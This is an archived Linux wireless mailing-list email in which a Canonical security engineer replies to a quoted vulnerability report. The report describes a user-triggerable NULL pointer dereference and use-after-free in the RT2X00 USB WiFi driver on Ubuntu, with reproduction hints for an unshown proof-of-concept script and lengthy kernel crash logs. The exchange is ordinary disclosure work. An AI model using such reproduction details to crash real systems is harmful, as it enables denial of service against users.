Return-Path: <linux-wireless+bounces-10864-lists+linux-wireless=lfdr.de@vger.kernel.org>
X-Original-To: lists+linux-wireless@lfdr.de
Delivered-To: lists+linux-wireless@lfdr.de
Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [IPv6:2604:1380:45e3:2400::1])
	by mail.lfdr.de (Postfix) with ESMTPS id 186229459C4
	for <lists+linux-wireless@lfdr.de>; Fri,  2 Aug 2024 10:20:20 +0200 (CEST)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 75268280CD8
	for <lists+linux-wireless@lfdr.de>; Fri,  2 Aug 2024 08:20:18 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id CF6AB1494DE;
	Fri,  2 Aug 2024 08:20:15 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=canonical.com header.i=@canonical.com header.b="rfMyTWw3"
X-Original-To: linux-wireless@vger.kernel.org
Received: from smtp-relay-canonical-0.canonical.com (smtp-relay-canonical-0.canonical.com [185.125.188.120])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 709802C181;
	Fri,  2 Aug 2024 08:20:10 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=185.125.188.120
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1722586815; cv=none; b=LuVOK219q+aM9Nj7dX5TIQ1aGosrk7pX/5AuhaaBcle4VCKPfHwzy9bhzVKQQHXc+/oHVNrp/ijPvDYS1QOhqUP/+2ZvQELiqR/vnEg+IRA6yO4lDmpRLuvfu+I8Hpk1CeVf7XLHwJGksAH4jcsZPEqtNRxWloJ6Wx+y55rV8/w=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1722586815; c=relaxed/simple;
	bh=CoFCCcXDs9unFCdLXUuEKFjUrZwHzej5nJ/NxcCeS5o=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=j5aO9uJjHmZuMFSg7uUUqj9X9rLajNCefRyeHp68IwdeC1HmGQ9CE+48b1gNXU2AmT7YhAcNlKFaXbwXgjPInAjPzAmOAVhZq+Au38Fs16ZZWWF86JdvsWaafZ1PQx1bs9PJJlTtdgnPqJHCb7lOymHwUoxSf1qmDE7/R2RcN3w=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=canonical.com; spf=pass smtp.mailfrom=canonical.com; dkim=pass (2048-bit key) header.d=canonical.com header.i=@canonical.com header.b=rfMyTWw3; arc=none smtp.client-ip=185.125.188.120
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=canonical.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=canonical.com
Received: from aeon (unknown [122.147.171.160])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange ECDHE (P-256) server-signature RSA-PSS (2048 bits) server-digest SHA256)
	(No client certificate requested)
	by smtp-relay-canonical-0.canonical.com (Postfix) with ESMTPSA id 0C79440EE1;
	Fri,  2 Aug 2024 08:19:58 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=canonical.com;
	s=20210705; t=1722586800;
	bh=XSxCi/ZTjt01rLdjoqoDWycV3+oiltiVH2hHcShdcn4=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:In-Reply-To;
	b=rfMyTWw31apVTgWjHxLotCCBlcum+bCx78IeViPF/Qyabn+RiynMmD9tqDyYqoAlQ
	 kjzvDE1uyPqvYeMaEI2/LDRWkvfUvNk0hm7ERZ+K8kRp++whFNCMNA7ArReFo4EmRl
	 9jNv2avv7r7dhzDLLEaXwPPJPDaNlh5KKokdi7/I5Dev41T03mODwAtS3lKlsipZIv
	 hd/kqT5msz2xVuX+KUmWWQGPxh3W+w6j45EnJ57C87IyrjvC6vCKNofSqU9KJd3oa0
	 xSB8ugOyc2HhtJ6QS6HOy3o3GmuGGTan/9QsxqlUOq4Ky8b1M84HpJN4PLsmT2fwef
	 8rFX+9CO5sj/A==
Date: Fri, 2 Aug 2024 03:19:50 -0500
From: Mark Esler <mark.esler@canonical.com>
To: color Ice <wirelessdonghack@gmail.com>
Cc: stf_xl@wp.pl, kvalo@kernel.org, linux-wireless@vger.kernel.org,
	linux-kernel@vger.kernel.org
Subject: Re: Ubuntu RT2X00 WIFI USB Driver Kernel NULL pointer
 Dereference&Use-After-Free Vulnerability
Message-ID: <ZqyWpovXcaAX2f5c@aeon>
References: <CAOV16XESCK0-sMENJFxvWiKqogBJ4PQwA2DvJBvWq-g+NtV8ow@mail.gmail.com>
Precedence: bulk
X-Mailing-List: linux-wireless@vger.kernel.org
List-Id: <linux-wireless.vger.kernel.org>
List-Subscribe: <mailto:linux-wireless+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-wireless+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha512;
	protocol="application/pgp-signature"; boundary="P6BFFi6uiqj4jpNB"
Content-Disposition: inline
In-Reply-To: <CAOV16XESCK0-sMENJFxvWiKqogBJ4PQwA2DvJBvWq-g+NtV8ow@mail.gmail.com>


--P6BFFi6uiqj4jpNB
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Please see discussion in https://bugs.launchpad.net/ubuntu/+source/linux/+b=
ug/2073500

On Fri, Aug 02, 2024 at 03:57:47PM +0800, color Ice wrote:
> Dear RT2X00 driver maintainers,
>=20
> We have discovered a critical vulnerability in the RT2X00 driver. We
> recommend urgently submitting an update.
>=20
> *Vulnerability Description*: When a PC is running Ubuntu 22.04 or 24.04,
> executing our proof of concept (POC) can directly cause a null pointer
> dereference or use-after-free (UAF). The systems we tested were:
>=20
>    - *Description*: Ubuntu 22.04.4 LTS *Release*: 22.04
>    - *Description*: Ubuntu 24.04 LTS *Release*: 24.04
>=20
> We tested network cards from the RT2870/RT3070/RT5370 series, which all
> belong to the RT2X00 driver group, and all were able to trigger the
> vulnerability. Additionally, executing the POC requires only user-level
> privileges. Debian systems are not affected.

It is unclear if Ubuntu is the only affected distro.

> Now, there are a few issues that need to be discussed. When executing the
> POC on different PCs, it not only triggers a null pointer dereference but
> also occasionally triggers a use-after-free (UAF) issue. You can test this
> issue yourselves.
>=20
> *POC Execution Method*:
>=20
> python3 poc.py
>=20
> Some systems might be affected by the time.sleep function. If you cannot
> successfully reproduce the issue, please modify time.sleep(0.1) in the
> script to time.sleep(0.2). Below, I will provide the logs of the null
> pointer dereference and UAF from our kernel for analysis.
>=20
> Replace the VID and PID with your USB network card ID, which you can check
> using lsusb.
>=20
> --------------
>=20
>=20
> Crash Log-Null Pointer
>=20
>=20
> [  371.188382] ieee80211 phy23: rt2x00lib_request_firmware: Info - Loading
> firmware file 'rt2870.bin'
> [  371.188467] ieee80211 phy23: rt2x00lib_request_firmware: Info - Firmwa=
re
> detected - version: 0.36
> [  371.258315] BUG: kernel NULL pointer dereference, address:
> 0000000000000038
> [  371.258324] #PF: supervisor write access in kernel mode
> [  371.258328] #PF: error_code(0x0002) - not-present page
> [  371.258330] PGD 0 P4D 0
> [  371.258335] Oops: 0002 [#1] PREEMPT SMP NOPTI
> [  371.258339] CPU: 8 PID: 144 Comm: kworker/u40:2 Not tainted
> 6.8.0-40-generic #40~22.04.2-Ubuntu
> [  371.258344] Hardware name: Dell Inc. Vostro 3710/072TMP, BIOS 1.1.66
> 06/22/2022
> [  371.258346] Workqueue: phy23 rt2x00usb_work_rxdone [rt2x00usb]
> [  371.258363] RIP: 0010:rt2x00usb_work_rxdone+0x5f/0xc0 [rt2x00usb]
> [  371.258374] Code: 00 48 c7 45 d0 00 00 00 00 48 c7 45 d8 00 00 00 00 48
> c7 45 e0 00 00 00 00 74 45 4c 8d 65 c8 eb 2b 48 8b 47 18 be c0 0c 00 00
> <4c> 89 60 38 48 8b 57 10 0f b6 52 6a 88 50 31 e8 8d cc ec ff 48 8b
> [  371.258377] RSP: 0018:ffffa1de4063fe08 EFLAGS: 00010246
> [  371.258381] RAX: 0000000000000000 RBX: ffff8b1ef7366a90 RCX:
> 0000000000000000
> [  371.258383] RDX: 0000000000000000 RSI: 0000000000000cc0 RDI:
> ffff8b1d0be0e000
> [  371.258386] RBP: ffffa1de4063fe40 R08: 0000000000000000 R09:
> 0000000000000000
> [  371.258388] R10: 0000000000000000 R11: 0000000000000000 R12:
> ffffa1de4063fe08
> [  371.258390] R13: ffff8b1d001fcc00 R14: ffff8b1d0a838e05 R15:
> ffff8b1ef7366a90
> [  371.258392] FS:  0000000000000000(0000) GS:ffff8b207f600000(0000)
> knlGS:0000000000000000
> [  371.258395] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [  371.258397] CR2: 0000000000000038 CR3: 000000044d43c000 CR4:
> 0000000000f50ef0
> [  371.258400] PKRU: 55555554
> [  371.258402] Call Trace:
> [  371.258405]  <TASK>
> [  371.258408]  ? show_regs+0x6d/0x80
> [  371.258416]  ? __die+0x24/0x80
> [  371.258419]  ? page_fault_oops+0x99/0x1b0
> [  371.258425]  ? do_user_addr_fault+0x2ed/0x670
> [  371.258430]  ? exc_page_fault+0x83/0x1b0
> [  371.258437]  ? asm_exc_page_fault+0x27/0x30
> [  371.258444]  ? rt2x00usb_work_rxdone+0x5f/0xc0 [rt2x00usb]
> [  371.258454]  ? rt2x00usb_work_rxdone+0x8b/0xc0 [rt2x00usb]
> [  371.258463]  process_one_work+0x16c/0x350
> [  371.258470]  worker_thread+0x306/0x440
> [  371.258476]  ? __pfx_worker_thread+0x10/0x10
> [  371.258482]  kthread+0xef/0x120
> [  371.258486]  ? __pfx_kthread+0x10/0x10
> [  371.258491]  ret_from_fork+0x44/0x70
> [  371.258495]  ? __pfx_kthread+0x10/0x10
> [  371.258499]  ret_from_fork_asm+0x1b/0x30
> [  371.258505]  </TASK>
> [  371.258506] Modules linked in: ccm snd_hda_codec_hdmi rfcomm xe
> snd_hda_codec_cs8409 snd_hda_codec_generic drm_gpuvm drm_exec gpu_sched
> drm_suballoc_helper drm_ttm_helper cmac algif_hash overlay algif_skcipher
> af_alg bnep intel_uncore_frequency intel_uncore_frequency_common
> snd_sof_pci_intel_tgl x86_pkg_temp_thermal snd_sof_intel_hda_common
> intel_powerclamp coretemp soundwire_intel snd_sof_intel_hda_mlink
> soundwire_cadence snd_sof_intel_hda kvm_intel snd_sof_pci
> snd_sof_xtensa_dsp snd_sof kvm snd_sof_utils snd_soc_hdac_hda
> snd_hda_ext_core snd_soc_acpi_intel_match snd_soc_acpi
> soundwire_generic_allocation irqbypass soundwire_bus crct10dif_pclmul
> polyval_clmulni polyval_generic ghash_clmulni_intel binfmt_misc
> snd_usb_audio snd_soc_core sha256_ssse3 sha1_ssse3 snd_usbmidi_lib
> aesni_intel rtw88_8821ce snd_compress snd_ump ac97_bus mc rtw88_8821c
> rt2800usb snd_pcm_dmaengine rtw88_pci rt2x00usb crypto_simd cryptd
> snd_hda_intel rt2800lib dell_wmi snd_seq_midi snd_intel_dspcfg rtw88_core
> snd_intel_sdw_acpi snd_seq_midi_event
> [  371.258573]  rt2x00lib dell_smbios rapl snd_hda_codec btusb snd_rawmidi
> mei_pxp mei_hdcp intel_rapl_msr dcdbas nls_iso8859_1 intel_cstate i915
> mac80211 snd_hda_core dell_wmi_ddv btrtl snd_seq dell_smm_hwmon
> processor_thermal_device_pci snd_hwdep btintel cmdlinepart
> processor_thermal_device drm_buddy dell_wmi_sysman btbcm ledtrig_audio
> processor_thermal_wt_hint ttm firmware_attributes_class sparse_keymap
> dell_wmi_descriptor wmi_bmof snd_pcm spi_nor btmtk processor_thermal_rfim
> snd_seq_device mtd ee1004 snd_timer drm_display_helper
> processor_thermal_rapl cfg80211 bluetooth intel_rapl_common cec snd mei_me
> pl2303 processor_thermal_wt_req rc_core ecdh_generic
> processor_thermal_power_floor usbserial input_leds joydev mei i2c_algo_bit
> libarc4 ecc soundcore processor_thermal_mbox int340x_thermal_zone
> intel_pmc_core intel_vsec int3400_thermal pmt_telemetry acpi_thermal_rel
> pmt_class acpi_tad acpi_pad mac_hid sch_fq_codel msr parport_pc ppdev lp
> parport efi_pstore ip_tables x_tables autofs4 hid_generic usbhid hid nvme
> [  371.258648]  crc32_pclmul i2c_i801 spi_intel_pci nvme_core i2c_smbus
> r8169 spi_intel ahci nvme_auth xhci_pci video xhci_pci_renesas libahci
> realtek wmi
> [  371.258665] CR2: 0000000000000038
> [  371.258668] ---[ end trace 0000000000000000 ]---
> [  371.785813] RIP: 0010:rt2x00usb_work_rxdone+0x5f/0xc0 [rt2x00usb]
> [  371.785851] Code: 00 48 c7 45 d0 00 00 00 00 48 c7 45 d8 00 00 00 00 48
> c7 45 e0 00 00 00 00 74 45 4c 8d 65 c8 eb 2b 48 8b 47 18 be c0 0c 00 00
> <4c> 89 60 38 48 8b 57 10 0f b6 52 6a 88 50 31 e8 8d cc ec ff 48 8b
> [  371.785854] RSP: 0018:ffffa1de4063fe08 EFLAGS: 00010246
> [  371.785861] RAX: 0000000000000000 RBX: ffff8b1ef7366a90 RCX:
> 0000000000000000
> [  371.785863] RDX: 0000000000000000 RSI: 0000000000000cc0 RDI:
> ffff8b1d0be0e000
> [  371.785864] RBP: ffffa1de4063fe40 R08: 0000000000000000 R09:
> 0000000000000000
> [  371.785866] R10: 0000000000000000 R11: 0000000000000000 R12:
> ffffa1de4063fe08
> [  371.785867] R13: ffff8b1d001fcc00 R14: ffff8b1d0a838e05 R15:
> ffff8b1ef7366a90
> [  371.785868] FS:  0000000000000000(0000) GS:ffff8b207f600000(0000)
> knlGS:0000000000000000
> [  371.785870] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [  371.785872] CR2: 0000000000000038 CR3: 000000011dc92000 CR4:
> 0000000000f50ef0
> [  371.785873] PKRU: 55555554
> [  371.785876] note: kworker/u40:2[144] exited with irqs disabled
> [  371.793418] ieee80211 phy23: rt2800_wait_bbp_ready: Error - BBP regist=
er
> access failed, aborting
> [  371.793422] ieee80211 phy23: rt2800usb_set_device_state: Error - Device
> failed to enter state 4 (-5)
> [  371.799526] systemd-journald[438]: Compressed data object 1029 -> 509
> using ZSTD
> [  371.799553] systemd-journald[438]: Compressed data object 1020 -> 543
> using ZSTD
> [  387.857111] systemd-journald[438]: Successfully sent stream file
> descriptor to service manager.
> [  387.857138] systemd-journald[438]: Successfully sent stream file
> descriptor to service manager.
> [  387.861450] systemd-journald[438]: Successfully sent stream file
> descriptor to service manager.
> [  387.861472] systemd-journald[438]: Successfully sent stream file
> descriptor to service manager.
> [  387.865327] systemd-journald[438]: Successfully sent stream file
> descriptor to service manager.
> [  387.865344] systemd-journald[438]: Successfully sent stream file
> descriptor to service manager.
> [  387.872995] systemd-journald[438]: Successfully sent stream file
> descriptor to service manager.
> [  387.873032] systemd-journald[438]: Successfully sent stream file
> descriptor to service manager.
> [  387.961986] systemd-journald[438]: Successfully sent stream file
> descriptor to service manager.
> [  387.962012] systemd-journald[438]: Successfully sent stream file
> descriptor to service manager.
> [  388.018331] systemd-journald[438]: Successfully sent stream file
> descriptor to service manager.
> [  388.018398] systemd-journald[438]: Successfully sent stream file
> descriptor to service manager.
> [  388.067180] systemd-journald[438]: Successfully sent stream file
> descriptor to service manager.
> [  388.067201] systemd-journald[438]: Successfully sent stream file
> descriptor to service manager.
> [  388.323049] systemd-journald[438]: Successfully sent stream file
> descriptor to service manager.
> [  388.323086] systemd-journald[438]: Successfully sent stream file
> descriptor to service manager.
> [  453.167476] systemd-journald[438]: Sent WATCHDOG=3D1 notification.
>=20
>=20
>=20
> LOG-Crash-2:UAF
>=20
>=20
>=20
> [  +0.000002] refcount_t: addition on 0; use-after-free.
> [  +0.000006] WARNING: CPU: 16 PID: 754 at lib/refcount.c:25
> refcount_warn_saturate+0x12e/0x150
> [  +0.000007] Modules linked in: rt2800usb rt2x00usb rt2800lib rt2x00lib
> tcp_diag inet_diag bnep nfnetlink_queue nfnetlink_log bluetooth
> ecdh_generic ecc usbmon nf_conntrack_netlink xfrm_user xfrm_algo
> xt_addrtype br_netfilter ccm xt_CHECKSUM xt_MASQUERADE xt_conntrack
> ipt_REJECT nf_reject_ipv4 xt_tcpudp nft_compat nft_chain_nat nf_nat
> nf_conntrack nf_defrag_ipv6 nf_defrag_ipv4 nf_tables libcrc32c nfnetlink
> bridge stp llc overlay intel_rapl_msr intel_rapl_common
> snd_hda_codec_realtek snd_hda_codec_generic snd_hda_codec_hdmi
> snd_hda_intel snd_intel_dspcfg mt7921u mt76x2u snd_intel_sdw_acpi
> mt7921_common mt76x2_common edac_mce_amd amdgpu snd_hda_codec
> mt76_connac_lib mt76x02_usb mt76x02_lib mt76_usb snd_hda_core kvm_amd
> snd_hwdep mt76 binfmt_misc kvm snd_pcm irqbypass mac80211 crct10dif_pclmul
> snd_seq_midi amdxcp polyval_clmulni snd_seq_midi_event iommu_v2
> polyval_generic drm_buddy ghash_clmulni_intel sha256_ssse3 snd_rawmidi
> gpu_sched sha1_ssse3 drm_suballoc_helper aesni_intel drm_ttm_helper
> nls_iso8859_1 ttm crypto_simd
> [  +0.000095]  snd_seq cryptd cfg80211 drm_display_helper snd_seq_device
> snd_timer cec rapl rc_core joydev input_leds libarc4 drm_kms_helper
> eeepc_wmi snd wmi_bmof i2c_algo_bit k10temp soundcore ccp mac_hid
> sch_fq_codel msr parport_pc ppdev lp parport drm efi_pstore ip_tables
> x_tables autofs4 hid_logitech_hidpp hid_logitech_dj hid_generic usbhid hid
> mfd_aaeon asus_wmi video ledtrig_audio sparse_keymap platform_profile
> crc32_pclmul nvme ahci i2c_piix4 r8169 xhci_pci libahci nvme_core
> xhci_pci_renesas realtek nvme_common wmi
> [  +0.000063] CPU: 16 PID: 754 Comm: NetworkManager Not tainted
> 6.5.0-41-generic #41~22.04.2-Ubuntu
> [  +0.000003] Hardware name: System manufacturer System Product Name/TUF
> GAMING X570-PLUS, BIOS 3603 03/20/2021
> [  +0.000001] RIP: 0010:refcount_warn_saturate+0x12e/0x150
> [  +0.000003] Code: 1d a5 cc dc 01 80 fb 01 0f 87 6c f8 8d 00 83 e3 01 0f
> 85 52 ff ff ff 48 c7 c7 10 c0 1c a8 c6 05 85 cc dc 01 01 e8 d2 9f 8f ff
> <0f> 0b e9 38 ff ff ff 48 c7 c7 e8 bf 1c a8 c6 05 6c cc dc 01 01 e8
> [  +0.000002] RSP: 0018:ffffb0fe4126f4e8 EFLAGS: 00010246
> [  +0.000003] RAX: 0000000000000000 RBX: 0000000000000000 RCX:
> 0000000000000000
> [  +0.000002] RDX: 0000000000000000 RSI: 0000000000000000 RDI:
> 0000000000000000
> [  +0.000001] RBP: ffffb0fe4126f4f0 R08: 0000000000000000 R09:
> 0000000000000000
> [  +0.000001] R10: 0000000000000000 R11: 0000000000000000 R12:
> ffff919769c2e800
> [  +0.000002] R13: ffff91954a975000 R14: 0000000000000820 R15:
> 00000000ffffff00
> [  +0.000002] FS:  00007bfb476a34c0(0000) GS:ffff91a42ee00000(0000)
> knlGS:0000000000000000
> [  +0.000002] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [  +0.000001] CR2: 00000000dc9cae6c CR3: 000000011e4ce000 CR4:
> 0000000000750ee0
> [  +0.000002] PKRU: 55555554
> [  +0.000001] Call Trace:
> [  +0.000002]  <TASK>
> [  +0.000003]  ? show_regs+0x6d/0x80
> [  +0.000005]  ? __warn+0x89/0x160
> [  +0.000004]  ? refcount_warn_saturate+0x12e/0x150
> [  +0.000003]  ? report_bug+0x17e/0x1b0
> [  +0.000005]  ? handle_bug+0x46/0x90
> [  +0.000004]  ? exc_invalid_op+0x18/0x80
> [  +0.000003]  ? asm_exc_invalid_op+0x1b/0x20
> [  +0.000006]  ? refcount_warn_saturate+0x12e/0x150
> [  +0.000003]  ? refcount_warn_saturate+0x12e/0x150
> [  +0.000003]  usb_get_urb+0x52/0x90
> [  +0.000004]  usb_hcd_submit_urb+0x23/0x2e0
> [  +0.000003]  usb_submit_urb+0x254/0x6c0
> [  +0.000006]  rt2x00usb_kick_rx_entry+0xab/0xf0 [rt2x00usb]
> [  +0.000006]  rt2x00usb_clear_entry+0x2c/0x40 [rt2x00usb]
> [  +0.000005]  rt2x00queue_init_queues+0xa5/0x100 [rt2x00lib]
> [  +0.000008]  rt2x00lib_enable_radio+0x28/0xb0 [rt2x00lib]
> [  +0.000007]  rt2x00lib_start+0x87/0xd0 [rt2x00lib]
> [  +0.000007]  rt2x00mac_start+0x2d/0x80 [rt2x00lib]
> [  +0.000007]  drv_start+0x55/0x130 [mac80211]
> [  +0.000033]  ieee80211_do_open+0x353/0x7e0 [mac80211]
> [  +0.000030]  ieee80211_open+0x76/0xa0 [mac80211]
> [  +0.000027]  __dev_open+0x105/0x1d0
> [  +0.000004]  __dev_change_flags+0x1b5/0x230
> [  +0.000003]  dev_change_flags+0x27/0x80
> [  +0.000003]  do_setlink+0x3a1/0xe60
> [  +0.000004]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000003]  ? __nla_validate_parse+0x49/0x1e0
> [  +0.000005]  __rtnl_newlink+0x6e5/0x770
> [  +0.000005]  rtnl_newlink+0x48/0x80
> [  +0.000003]  rtnetlink_rcv_msg+0x170/0x430
> [  +0.000003]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000003]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
> [  +0.000002]  netlink_rcv_skb+0x5d/0x110
> [  +0.000005]  rtnetlink_rcv+0x15/0x30
> [  +0.000003]  netlink_unicast+0x1b3/0x2a0
> [  +0.000002]  netlink_sendmsg+0x25e/0x4e0
> [  +0.000004]  ____sys_sendmsg+0x3ef/0x420
> [  +0.000003]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000003]  ___sys_sendmsg+0x9a/0xf0
> [  +0.000004]  ? kvfree+0x31/0x40
> [  +0.000005]  __sys_sendmsg+0x89/0xf0
> [  +0.000004]  __x64_sys_sendmsg+0x1d/0x30
> [  +0.000001]  x64_sys_call+0x114d/0x20b0
> [  +0.000003]  do_syscall_64+0x55/0x90
> [  +0.000002]  ? __rseq_handle_notify_resume+0x37/0x70
> [  +0.000003]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000002]  ? exit_to_user_mode_loop+0xe5/0x130
> [  +0.000003]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000002]  ? exit_to_user_mode_prepare+0x30/0xb0
> [  +0.000001]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000002]  ? syscall_exit_to_user_mode+0x37/0x60
> [  +0.000003]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000001]  ? do_syscall_64+0x61/0x90
> [  +0.000002]  ? do_syscall_64+0x61/0x90
> [  +0.000002]  entry_SYSCALL_64_after_hwframe+0x73/0xdd
> [  +0.000002] RIP: 0033:0x7bfb4872799d
> [  +0.000021] Code: 28 89 54 24 1c 48 89 74 24 10 89 7c 24 08 e8 6a 90 f6
> ff 8b 54 24 1c 48 8b 74 24 10 41 89 c0 8b 7c 24 08 b8 2e 00 00 00 0f 05
> <48> 3d 00 f0 ff ff 77 33 44 89 c7 48 89 44 24 08 e8 ae 90 f6 ff 48
> [  +0.000001] RSP: 002b:00007ffd73cd3280 EFLAGS: 00000293 ORIG_RAX:
> 000000000000002e
> [  +0.000002] RAX: ffffffffffffffda RBX: 00000000000004a3 RCX:
> 00007bfb4872799d
> [  +0.000002] RDX: 0000000000000000 RSI: 00007ffd73cd32c0 RDI:
> 000000000000000c
> [  +0.000001] RBP: 000055d422a2e030 R08: 0000000000000000 R09:
> 0000000000000000
> [  +0.000001] R10: 0000000000000000 R11: 0000000000000293 R12:
> 0000000000000000
> [  +0.000001] R13: 00007ffd73cd3410 R14: 00007ffd73cd340c R15:
> 0000000000000000
> [  +0.000003]  </TASK>
> [  +0.000001] ---[ end trace 0000000000000000 ]---
> [  +0.000004] ------------[ cut here ]------------
> [  +0.000001] refcount_t: underflow; use-after-free.
> [  +0.000004] WARNING: CPU: 16 PID: 754 at lib/refcount.c:28
> refcount_warn_saturate+0xa3/0x150
> [  +0.000003] Modules linked in: rt2800usb rt2x00usb rt2800lib rt2x00lib
> tcp_diag inet_diag bnep nfnetlink_queue nfnetlink_log bluetooth
> ecdh_generic ecc usbmon nf_conntrack_netlink xfrm_user xfrm_algo
> xt_addrtype br_netfilter ccm xt_CHECKSUM xt_MASQUERADE xt_conntrack
> ipt_REJECT nf_reject_ipv4 xt_tcpudp nft_compat nft_chain_nat nf_nat
> nf_conntrack nf_defrag_ipv6 nf_defrag_ipv4 nf_tables libcrc32c nfnetlink
> bridge stp llc overlay intel_rapl_msr intel_rapl_common
> snd_hda_codec_realtek snd_hda_codec_generic snd_hda_codec_hdmi
> snd_hda_intel snd_intel_dspcfg mt7921u mt76x2u snd_intel_sdw_acpi
> mt7921_common mt76x2_common edac_mce_amd amdgpu snd_hda_codec
> mt76_connac_lib mt76x02_usb mt76x02_lib mt76_usb snd_hda_core kvm_amd
> snd_hwdep mt76 binfmt_misc kvm snd_pcm irqbypass mac80211 crct10dif_pclmul
> snd_seq_midi amdxcp polyval_clmulni snd_seq_midi_event iommu_v2
> polyval_generic drm_buddy ghash_clmulni_intel sha256_ssse3 snd_rawmidi
> gpu_sched sha1_ssse3 drm_suballoc_helper aesni_intel drm_ttm_helper
> nls_iso8859_1 ttm crypto_simd
> [  +0.000055]  snd_seq cryptd cfg80211 drm_display_helper snd_seq_device
> snd_timer cec rapl rc_core joydev input_leds libarc4 drm_kms_helper
> eeepc_wmi snd wmi_bmof i2c_algo_bit k10temp soundcore ccp mac_hid
> sch_fq_codel msr parport_pc ppdev lp parport drm efi_pstore ip_tables
> x_tables autofs4 hid_logitech_hidpp hid_logitech_dj hid_generic usbhid hid
> mfd_aaeon asus_wmi video ledtrig_audio sparse_keymap platform_profile
> crc32_pclmul nvme ahci i2c_piix4 r8169 xhci_pci libahci nvme_core
> xhci_pci_renesas realtek nvme_common wmi
> [  +0.000036] CPU: 16 PID: 754 Comm: NetworkManager Tainted: G        W
>      6.5.0-41-generic #41~22.04.2-Ubuntu
> [  +0.000002] Hardware name: System manufacturer System Product Name/TUF
> GAMING X570-PLUS, BIOS 3603 03/20/2021
> [  +0.000001] RIP: 0010:refcount_warn_saturate+0xa3/0x150
> [  +0.000002] Code: 94 00 0f b6 1d 2b cd dc 01 80 fb 01 0f 87 df f8 8d 00
> 83 e3 01 75 dd 48 c7 c7 40 c0 1c a8 c6 05 0f cd dc 01 01 e8 5d a0 8f ff
> <0f> 0b eb c6 0f b6 1d 02 cd dc 01 80 fb 01 0f 87 9f f8 8d 00 83 e3
> [  +0.000002] RSP: 0018:ffffb0fe4126f4e8 EFLAGS: 00010246
> [  +0.000001] RAX: 0000000000000000 RBX: 0000000000000000 RCX:
> 0000000000000000
> [  +0.000001] RDX: 0000000000000000 RSI: 0000000000000000 RDI:
> 0000000000000000
> [  +0.000001] RBP: ffffb0fe4126f4f0 R08: 0000000000000000 R09:
> 0000000000000000
> [  +0.000002] R10: 0000000000000000 R11: 0000000000000000 R12:
> 00000000fffffffe
> [  +0.000001] R13: ffff91954a975000 R14: 0000000000000820 R15:
> 00000000ffffff00
> [  +0.000001] FS:  00007bfb476a34c0(0000) GS:ffff91a42ee00000(0000)
> knlGS:0000000000000000
> [  +0.000001] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [  +0.000002] CR2: 00000000dc9cae6c CR3: 000000011e4ce000 CR4:
> 0000000000750ee0
> [  +0.000001] PKRU: 55555554
> [  +0.000001] Call Trace:
> [  +0.000001]  <TASK>
> [  +0.000001]  ? show_regs+0x6d/0x80
> [  +0.000002]  ? __warn+0x89/0x160
> [  +0.000003]  ? refcount_warn_saturate+0xa3/0x150
> [  +0.000002]  ? report_bug+0x17e/0x1b0
> [  +0.000003]  ? handle_bug+0x46/0x90
> [  +0.000002]  ? exc_invalid_op+0x18/0x80
> [  +0.000003]  ? asm_exc_invalid_op+0x1b/0x20
> [  +0.000003]  ? refcount_warn_saturate+0xa3/0x150
> [  +0.000003]  ? refcount_warn_saturate+0xa3/0x150
> [  +0.000001]  usb_free_urb+0x67/0x80
> [  +0.000003]  usb_hcd_submit_urb+0x14e/0x2e0
> [  +0.000002]  usb_submit_urb+0x254/0x6c0
> [  +0.000003]  rt2x00usb_kick_rx_entry+0xab/0xf0 [rt2x00usb]
> [  +0.000005]  rt2x00usb_clear_entry+0x2c/0x40 [rt2x00usb]
> [  +0.000003]  rt2x00queue_init_queues+0xa5/0x100 [rt2x00lib]
> [  +0.000006]  rt2x00lib_enable_radio+0x28/0xb0 [rt2x00lib]
> [  +0.000005]  rt2x00lib_start+0x87/0xd0 [rt2x00lib]
> [  +0.000005]  rt2x00mac_start+0x2d/0x80 [rt2x00lib]
> [  +0.000005]  drv_start+0x55/0x130 [mac80211]
> [  +0.000025]  ieee80211_do_open+0x353/0x7e0 [mac80211]
> [  +0.000028]  ieee80211_open+0x76/0xa0 [mac80211]
> [  +0.000026]  __dev_open+0x105/0x1d0
